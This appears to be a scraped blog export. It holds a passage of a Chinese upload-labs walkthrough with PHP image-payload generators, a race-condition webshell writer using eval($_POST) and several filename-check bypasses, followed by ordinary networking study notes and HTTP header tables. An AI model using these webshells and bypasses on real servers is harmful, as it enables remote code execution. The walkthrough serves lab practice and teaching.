UPLOAD_PATH.&apos;/&apos;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传出错！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; }} hack:和13一样传gif后发现有个问题就是渲染后内容变了但是有些没变，GIF我们可以把我们要写的木马语句写入到没变的那一段即可png可以脚本跑 &lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,&apos;./1.png&apos;);?&gt; JPG生成 &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) { die(&apos;php-gd is not installed&apos;); } if(!isset($argv[1])) { die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&apos;Incorrect SOI marker&apos;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) { die(&apos;Success!&apos;); } else { break; } } } } unlink(&apos;payload_&apos;.$argv[1]); die(&apos;Something\\&apos;s wrong&apos;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&apos;/(\\d+) extraneous bytes before marker/&apos;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &apos;&apos;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&apos;File not exists [&apos;.$filename.&apos;]&apos;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&apos;End Of File&apos;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&apos;End Of File&apos;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } }?&gt; 准备随便找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg. 插入php代码使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg详细介绍https://xz.aliyun.com/t/2657#toc-13 Pass-17条件竞争竞争条件原理介绍网站逻辑：1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。在删除之前访问上传的php文件，从而执行上传文件中的php代码。例如：上传文件代码如下 &lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&apos;);?&gt; 源码 $is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;])){ $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &apos;上传出错！&apos;; }} Hack:这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。先新建一个php，包含写入一句话木马 &lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&apos;);?&gt; 发两个包，一个是一直上传demo.php,一个是一直访问demo.php通过竞争，可能会写入shell.phpemm，没跑出来，估计是我拿自己本子处理太快了，写文件太难了，所以简单一些我们写入 &lt;?php phpinfo();?&gt; 成功了PS:过了很久不甘心，又跑了一遍写木马，成功了,55555 Pass-18图片马直接上传成功了我滴个乖乖 Pass-19move_uploaded_file() 00截断主要利用PHP任意文件上传漏洞（CVE-2015-2348）漏洞利用在于 move_uploaded_file($_FILES[&apos;name&apos;][&apos;tmp_name&apos;],&quot;/file.php\\x00.jpg&quot;); 这本应该创建一个名为file.php\\x00.jpg的文件，但实际上创建的文件是file.php。源码 $is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&apos;save_name&apos;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = &apos;上传出错！&apos;; } }else{ $msg = &apos;禁止保存为该类型文件！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; }} 本题主要是没过滤文件名所以在文件名上%00截断ORZ没跑出来.phP，居然绕过了，哭唧唧 Pass-20太难了，好难看源码 $is_upload = false;$msg = null;if(!empty($_FILES[&apos;upload_file&apos;])){ //检查MIME $allow_type = array(&apos;image/jpeg&apos;,&apos;image/png&apos;,&apos;image/gif&apos;); if(!in_array($_FILES[&apos;upload_file&apos;][&apos;type&apos;],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST[&apos;save_name&apos;]) ? $_FILES[&apos;upload_file&apos;][&apos;name&apos;] : $_POST[&apos;save_name&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } $ext = end($file); $allow_suffix = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1]; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } }}else{ $msg = &quot;请选择要上传的文件！&quot;;} 过程 最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。$file[0]为smi1e.php/，也就是reset($file)，然后再令$file[2]为白名单中的jpg。此时end($file)等于jpg，$file[count($file) - 1]为空。而 $file_name = reset($file) . &apos;.&apos; . $file[count($file) - 1];，也就是Haha.php/.，最终move_uploaded_file会忽略掉/.，最终上传Haha.php。 解题思路：（数组 + /. 绕过）","link":"2019/09/01/Upload-labs/"},{"title":"计算机网络自顶向下-应用层及书后套接字编程练习参考","text":"虽然说数字阅读填充碎片化时间，但是确实阅读纸质书更容易安静下来，之前看电子档的这本书只是囫囵吞枣，打算再看一次纸质书顺便把书后编程题做完去，否则只知道理论则百无一用是”书生”一、进程通信在操作系统的术语中，进行通信额实际上是进程(process)而不是程序。一个进程可以被认为是运行在端系统中的一个程序。当进程运行在相同的端系统时，他们使用进程间相互通信机制相互通信，该机制由端系统上的操作系统确定。在两个不同端系统上的进程，通过跨越计算机网络交换报文(message)而相互通信。 1.1、客户和服务器进程在给定的一对进程的通信会话场景中，发起通信（即在该会话开始时发起与其他进程的联系）的进程被标识为客户，在会话开始时等待联系的进程是服务器。 1.2、进程与计算机网络之间的接口进程通过一个称为“套接字（socket）”的软件接口向网络发送报文和从网络接收报文。套接字也被称为应用程序和网络之间的应用程序编程接口（Application programing interface，API）。 1.3、运输层可以提供的四大方面服务①可靠数据传输（reliable data transfer）： 当一个运输层协议提供这种服务时，发送进程只要将其数据传递进套接字，就可以完全相信该数据能够无差错地到达接收进程。当一个运输层协议不提供可靠数据传输时，由发送进程发送的某些数据可能不能够到达接收进程，这只适合容忍丢失的应用（loss-tolerant application）。 有很多多媒体应用就可以承受一定量的数据丢失（如音频、视频）。 ②吞吐量： 运输层协议能够以某种特定的速率提供确保的可用吞吐量。 具有吞吐量要求的应用程序被称为带宽敏感的应用（**bandwidth-sensitive application**）。 带宽敏感的应用具有特定的吞吐量要求，而弹性应用（**elastic application**）能够根据情况或多或少地利用可供使用的吞吐量。 ③定时： 运输层协议也能提供定时保证，如同具有吞吐量保证那样，定时保证能够以多种形式实现：比如，可以保证每个比特到达接收方的套接字不迟于100ms。 这种服务将对交互式实时应用程序有吸引力。 ④安全性： 运输协议能够为应用程序提供一种或多种安全性服务，例如，有些发送主机中，运输协议可以加密由发送进程传输的所有数据；在接收主机中，运输层协议能够再将数据交付给接收进程之前解密这些数据。 运输协议还提供除了机密性意外的其他安全性服务，包括数据完整性和端点识别。 1.4、因特网提供的运输服务因特网（一般的是TCP/IP网络）为应用程序提供两个运输层协议，即UDP和TCP。 当一个软件开发者为因特网创建一个新的应用时，首先要做出的决定是，选择UDP还是TCP。 ①TCP服务 （1）面向连接的服务： 在应用层数据报文开始流动之前，其客户机程序和服务器程序之间互相交换运输层控制信息，完成握手阶段。这个过程可以让它们为大量分组的到来做好准备。 在握手阶段过后，一个TCP**连接（**TCP connection**）**就在两个进程的套接字之间建立了。 这条连接是全双工的，即连接双方的进程可以在此连接上同时进行报文收发。 当应用程序结束报文发送时，必须拆除该连接。 （2）可靠的数据传送服务 （有拥塞控制机制） ②SSL（secure socket layer，安全套接字层）服务 无论TCP还是UDP都没有提供任何加密机制，因此，因特网界研制了TCP的加强版SSL。 SSL不仅可以做到传统的TCP所能够做到的一切，而且提供了加密、数据完整性和端点鉴别这些关键的进程到进程的安全性服务。 SSL有自己的套接字API，类似于传统的TCP套接字API。 发送进程（明文数据）→SSL套接字（加密后的数据）→TCP套接字（加密后的数据）→接收进程的TCP套接字（加密后的数据）→接收进程的SSL套接字（明文数据）→接收进程 ③UDP服务 （1）UDP是一种不提供不必要服务的轻量级运输协议，它仅提供最小服务。 （2）UDP是无连接的，因此在两个进程通信前没有握手过程。 （3）UDP协议提供一种不可靠数据运输服务。 （4）UDP没有包括拥塞控制机制，所以UDP的发送端可以用它选定的任何速率向其下层（网络层）注入数据。 ④因特网运输协议所不提供的服务 今天的因特网不能为应用提供任何定时或带宽保证。 时间敏感的应用通常是靠应用程序的设计，来最大程度的适应这种服务的缺乏。 因特网电话应用通常能够容忍某些数据丢失，但要求要达到一定的最小速率才能有效工作，所以通常会选择UDP来绕开TCP的拥塞控制机制。 1.5、应用层协议（application-layer protocol）应用层协议定义了： ①交换的报文类型，如请求报文和响应报文。 ②各种报文类型的语法，如报文中的各个字段和这些字段是如何描述的。 ③字段的语义，即这些字段中包含的信息的含义。 ④一个进程何时以及如何发送报文，对报文进行响应的规则。 应用层协议只是网络应用的非常重要的一部分 二、Web和HTTP对于大多数用户来说，web最有吸引力的就是它的按需操作。 2.1、Http是一个无状态协议（stateless protocol）。HTTP服务器向客户发送被请求的文件，而不存储任何关于该客户的状态信息，所以我们说HTTP是一个无状态协议（stateless protocol）。 2.2、非持续连接和持续连接**非持续连接（non-persistant connection，又称“短连接”)**：每对请求/响应由一个单独的TCP连接发送。 **持续连接(persistant connection，又称“长连接”)**：所有的请求和响应都经一相同的TCP连接发送。 在默认配置下，大部分浏览器打开5~10个并行的TCP连接，而每条连接处理一个请求响应事务。 如果用户愿意，最大并行连接数可以设置为1，这样10条连接就会串行建立。 浏览器和web服务器建立一个TCP**连接**时，会涉及到一个“三次握手”过程。 三次握手过程： ①客户向服务器发送一个小TCP报文段。 ②服务器用一个小TCP报文段做出确认和响应。 ③客户向服务器返回确认。 2.3、cookiecookie的作用：cookie允许web服务器对用户进行跟踪，这样一来web站点便可以识别用户、限制用户的访问。 cookie 技术有四个组件： ①在HTTP响应报文中有一个cookie首部行。 ②在HTTP请求报文中有一个cookie首部行。 ③在用户端系统中保留有一个cookie文件，并由用户的浏览器进行管理。 ④位于web站点的一个后端数据库。 2.4、Web缓存Web缓存器带来的优点： ①Web缓存器可以大大减少一个机构的接入链路到因特网的通信量。 ②Web缓存器能从整体上大大降低因特网上的Web流量，从而改善所有应用的性能。 （ISP可以通过内容分发网络（Content Distribution Network，CDN）技术来避免升级因特网链路的支出） 引入一个概念——缓存命中率：由一个缓存器所满足的请求占比率。（通常在0.2~0.7之间） 通过请求头的If-Modified-Since和响应头的Last-Modified实现 三、文件传输协议和电子邮件3.1、文件传输协议：FTPHTTP和FTP都是文本传输协议，他们有很多共同点，例如都运行在TCP上，但他们最显著的区别是FTP使用了两个并行的TCP连接，一个是控制连接，一个是数据连接。控制连接用于控制传输命令（put，get），数据连接用于传输文件数据。 电子邮件系统有 3 个主要组成部分： 用户代理、邮件服务器、简单邮件传输协议（SMTP）。 3.2、SMTPSMTP是网络电子邮件应用的核心，一般不使用中间邮件服务器发送邮件，即使两个邮件服务器位于地球两端它使用TCP连接和ASCII编码(只能使用ASCII编码意味着传送二进制的多媒体文件会很麻烦)。为了描述SMTP的基本操作，我们假设ALice要给Bob发送一封简单的ASCII报文： Alice调用他的用户代理程序并提供Bob的邮件地址，撰写报文，然后指示用户代理程序发送报文 Alice的用户代理程序把报文发送给它的邮件服务器，在那里该报文被放在报文队列中 运行在Alice邮件服务器上SMTP客户端发现报文队列中的报文，它就创建一个连接到Bob邮件服务器上的SMTP客户端的TCP连接 在经过初始的SMTP握手后，发送报文 Bob的邮件服务器接收报文后，将报文放在Bob的邮箱中 在Bob方便时，调用他的用户代理程序阅读报文 3.3、邮件访问协议当我的邮件服务器有一封邮件，我如何把它取回到我的用户代理程序呢？由于SMTP是一个推协议，我们只能用过引入其他的邮件访问协议来解决这个问题。目前有一些流行的邮件访问协议第三版的邮局协议（POP3）、因特网邮件访问协议（IMAP）以及HTTP。 3.4、HTTP是拉协议，SMTP是推协议四、DNS服务 4.1、分布式、层次数据库DNS使用大量DNS服务器，以层次方式组织，分为3中类型：根DNS服务器、顶级域（TLD）DNS服务器、权威DNS服务器。 根DNS服务器：全球一共13个根DNS服务器。规定了合法域名.com .net .org等顶级域服务器：负责维护顶级域名如com、org以及所有国家顶级域名cn、uk等权威DNS服务器：在因特网上具有公共可访问主机（web服务器）的每个组织机构必须提供公共可访问的DNS记录，这些记录将这些主机名映射为IP地址。多数大学和大公司都实现或维护其权威DNS服务器。4.2、DNS缓存为了改善时延性能并减少在因特网上传输的DNS报文数量，DNS使用缓存技术。通常在本地服务器实现，可以缓存主机名/IP地址对，可以缓存TLD服务器地址，从而绕过根DNS服务器。 4.3、DNS记录和报文资源记录是一个4元组：（Name，Value，Type，TTL） TTL为该记录的生存时间，决定了资源记录应当从缓存中删除的时间。 Type=A，则Name是主机名，Value是该主机名对应的IP地址。 Type=NS，则Name是域，Value是如何获取该域中主机IP地址的权威DNS服务器的主机名。 Type=CNAME，则Value是别名为Name的主机对应的规范主机名。 Type=MX，则Value是别名为Name的邮件服务器对应的规范主机名。从而使得同一公司的邮件服务器和web服务器可以使用相同别名。 五、P2P文件分发和BitTorrent协议 BitTorrent是一种用于文件分发的流行P2P协议［Chao 2011］。用BitTorrent的术语来讲，参与一个特定文件分发的所有对等方的集合被称为一个洪流（torrent）。在一个洪流中的对等方彼此下载等长度的文件块（chunk），典型的块长度为256KB。当一个对等方首次加入一个洪流时，它没有块。随着时间的流逝，它累积了越来越多的块。当它下载块时，也为其他对等方上载了多个块。一旦某对等方获得了整个文件，它也许（自私地）离开洪流，或（大公无私地）留在该洪流中并继续向其他对等方上载块。同时，任何对等方可能在任何时候仅具有块的子集就离开该洪流，并在以后重新加入该洪流中。 每个洪流具有一个基础设施结点，称为追踪器（tracker）。当一个对等方加入某洪流时，它向追踪器注册自己，并周期性地通知追踪器它仍在该洪流中。以这种方式，追踪器跟踪正参与在洪流中的对等方。 最稀缺优先（rarest first）的技术在决定请求哪些块的过程中，Alice使用一种称为最稀缺优先（rarest first）的技术。这种技术的思路是，针对她没有的块在她的邻居中决定最稀缺的块（最稀缺的块就是那些在她的邻居中副本数量最少的块），并首先请求那些最稀缺的块。这样，最稀缺块得到更为迅速的重新分发，其目标是（大致地）均衡每个块在洪流中的副本数量。 六、UDP和TCP套接字编程（基于python3)由于书上是基于python2 的，所有做了些改变基于python3https://github.com/Kit4y/Computer-Networking-Programming-Exercises PS1、HTTP响应头和请求头信息对照表HTTP Request Header 请求头 Header 解释 示例 Accept 指定客户端能够接收的内容类型 Accept: text/plain, text/html Accept-Charset 浏览器可以接受的字符编码集。 Accept-Charset: iso-8859-5 Accept-Encoding 指定浏览器可以支持的web服务器返回内容压缩编码类型。 Accept-Encoding: compress, gzip Accept-Language 浏览器可接受的语言 Accept-Language: en,zh Accept-Ranges 可以请求网页实体的一个或者多个子范围字段 Accept-Ranges: bytes Authorization HTTP授权的授权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Cache-Control 指定请求和响应遵循的缓存机制 Cache-Control: no-cache Connection 表示是否需要持久连接。（HTTP 1.1默认进行持久连接） Connection: close Cookie HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 Cookie: $Version=1; Skin=new; Content-Length 请求的内容长度 Content-Length: 348 Content-Type 请求的与实体对应的MIME信息 Content-Type: application/x-www-form-urlencoded Date 请求发送的日期和时间 Date: Tue, 15 Nov 2010 08:12:31 GMT Expect 请求的特定的服务器行为 Expect: 100-continue From 发出请求的用户的Email From: user@email.com Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com If-Match 只有请求内容与实体相匹配才有效 If-Match: “737060cd8c284d8af7ad3082f209582d” If-Modified-Since 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-None-Match 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 If-None-Match: “737060cd8c284d8af7ad3082f209582d” If-Range 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag If-Range: “737060cd8c284d8af7ad3082f209582d” If-Unmodified-Since 只在实体在指定时间之后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT Max-Forwards 限制信息通过代理和网关传送的时间 Max-Forwards: 10 Pragma 用来包含实现特定的指令 Pragma: no-cache Proxy-Authorization 连接到代理的授权证书 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Range 只请求实体的一部分，指定范围 Range: bytes=500-999 Referer 先前网页的地址，当前请求网页紧随其后,即来路 Referer: http://www.zcmhi.com/archives/71.html TE 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息 TE: trailers,deflate;q=0.5 Upgrade 向服务器指定某种传输协议以便服务器进行转换（如果支持） Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 User-Agent User-Agent的内容包含发出请求的用户信息 User-Agent: Mozilla/5.0 (Linux; X11) Via 通知中间网关或代理服务器地址，通信协议 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 关于消息实体的警告信息 Warn: 199 Miscellaneous warning HTTP Responses Header 响应头 Header 解释 示例 Accept-Ranges 表明服务器是否支持指定范围请求及哪种类型的分段请求 Accept-Ranges: bytes Age 从原始服务器到代理缓存形成的估算时间（以秒计，非负） Age: 12 Allow 对某网络资源的有效的请求行为，不允许则返回405 Allow: GET, HEAD Cache-Control 告诉所有的缓存机制是否可以缓存及哪种类型 Cache-Control: no-cache Content-Encoding web服务器支持的返回内容压缩编码类型。 Content-Encoding: gzip Content-Language 响应体的语言 Content-Language: en,zh Content-Length 响应体的长度 Content-Length: 348 Content-Location 请求资源可替代的备用的另一地址 Content-Location: /index.htm Content-MD5 返回资源的MD5校验值 Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ== Content-Range 在整个返回体中本部分的字节位置 Content-Range: bytes 21010-47021/47022 Content-Type 返回内容的MIME类型 Content-Type: text/html; charset=utf-8 Date 原始服务器消息发出的时间 Date: Tue, 15 Nov 2010 08:12:31 GMT ETag 请求变量的实体标签的当前值 ETag: “737060cd8c284d8af7ad3082f209582d” Expires 响应过期的日期和时间 Expires: Thu, 01 Dec 2010 16:00:00 GMT Last-Modified 请求资源的最后修改时间 Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT Location 用来重定向接收方到非请求URL的位置来完成请求或标识新的资源 Location: http://www.zcmhi.com/archives/94.html Pragma 包括实现特定的指令，它可应用到响应链上的任何接收方 Pragma: no-cache Proxy-Authenticate 它指出认证方案和可应用到代理的该URL上的参数 Proxy-Authenticate: Basic refresh 应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持） Refresh: 5; url=http://www.zcmhi.com/archives/94.html Retry-After 如果实体暂时不可取，通知客户端在指定时间之后再次尝试 Retry-After: 120 Server web服务器软件名称 Server: Apache/1.3.27 (Unix) (Red-Hat/Linux) Set-Cookie 设置Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1 Trailer 指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards Transfer-Encoding 文件传输编码 Transfer-Encoding:chunked Vary 告诉下游代理是使用缓存响应还是从原始服务器请求 Vary: * Via 告知代理客户端响应是通过哪里发送的 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 警告实体可能存在的问题 Warning: 199 Miscellaneous warning WWW-Authenticate 表明客户端请求实体应该使用的授权方案 WWW-Authenticate: Basic PS2、HTTP状态码表 状态码 状态码英文名称 中文描述 100 Continue 继续。客户端应继续其请求 101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 200 OK 请求成功。一般用于GET与POST请求 201 Created 已创建。成功请求并创建了新的资源 202 Accepted 已接受。已经接受请求，但未处理完成 203 Non-Authoritative Information 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 205 Reset Content 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 206 Partial Content 部分内容。服务器成功处理了部分GET请求 300 Multiple Choices 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 301 Moved Permanently 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI 303 See Other 查看其它地址。与301类似。使用GET和POST请求查看 304 Not Modified 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 305 Use Proxy 使用代理。所请求的资源必须通过代理访问 306 Unused 已经被废弃的HTTP状态码 307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向 400 Bad Request 客户端请求的语法错误，服务器无法理解 401 Unauthorized 请求要求用户的身份认证 402 Payment Required 保留，将来使用 403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求 404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 405 Method Not Allowed 客户端请求中的方法被禁止 406 Not Acceptable 服务器无法根据客户端请求的内容特性完成请求 407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 408 Request Time-out 服务器等待客户端发送的请求时间过长，超时 409 Conflict 服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突 410 Gone 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息 412 Precondition Failed 客户端请求信息的先决条件错误 413 Request Entity Too Large 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 414 Request-URI Too Large 请求的URI过长（URI通常为网址），服务器无法处理 415 Unsupported Media Type 服务器无法处理请求附带的媒体格式 416 Requested range not satisfiable 客户端请求的范围无效 417 Expectation Failed 服务器无法满足Expect的请求头信息 500 Internal Server Error 服务器内部错误，无法完成请求 501 Not Implemented 